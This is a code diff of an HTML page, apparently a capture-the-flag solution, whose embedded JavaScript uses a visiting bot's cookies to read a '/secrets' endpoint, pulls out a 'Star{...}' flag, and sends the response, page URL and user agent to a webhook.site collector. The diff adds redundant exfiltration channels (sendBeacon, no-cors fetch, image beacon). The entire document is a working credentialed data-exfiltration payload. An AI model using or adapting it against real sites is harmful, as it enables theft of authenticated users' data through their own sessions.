@@ -2,24 +2,22 @@
 <h1>Exfil in progress…</h1>
 <script>
 (async () => {
-  const WH = "https://webhook.site/7699f217-b736-4fc2-a0d7-dc471e38814d";
+  const WH = "https://webhook.site/7699f217-b736-4fc2-a0d7-dc471e38814d";          // <- sera remplacé ci-dessous
+  function send(obj){
+    const s = JSON.stringify(obj);
+    try { navigator.sendBeacon(WH, s); } catch(e){}
+    try { fetch(WH, { method:"POST", mode:"no-cors", body:s }); } catch(e){}
+    try { (new Image).src = WH + "?d=" + encodeURIComponent(s); } catch(e){}
+  }
   try {
-    // 1) Lire /secrets avec les cookies du bot
     const r = await fetch("https://api.takedown.cyxo.re/secrets", { credentials: "include" });
     const t = await r.text();
-
-    // 2) Exfil brute au webhook (no-cors => pas de preflight, mais le corps part bien)
-    const body = JSON.stringify({
-      when: new Date().toISOString(),
-      from: location.href,
-      ua: navigator.userAgent,
-      status: r.status,
-      text: t,
-      flag: (t.match(/Star\{[^}]+\}/) || [null])[0]
-    });
-    await fetch(WH, { method: "POST", mode: "no-cors", body });
+    const flag = (t.match(/Star\{[^}]+\}/) || [null])[0];
+    send({ when:new Date().toISOString(), from:location.href, ua:navigator.userAgent,
+           status:r.status, text:t, flag });
   } catch (e) {
-    await fetch(WH, { method: "POST", mode: "no-cors", body: String(e) });
+    send({ when:new Date().toISOString(), from:location.href, ua:navigator.userAgent,
+           error:String(e) });
   }
 })();
 </script>
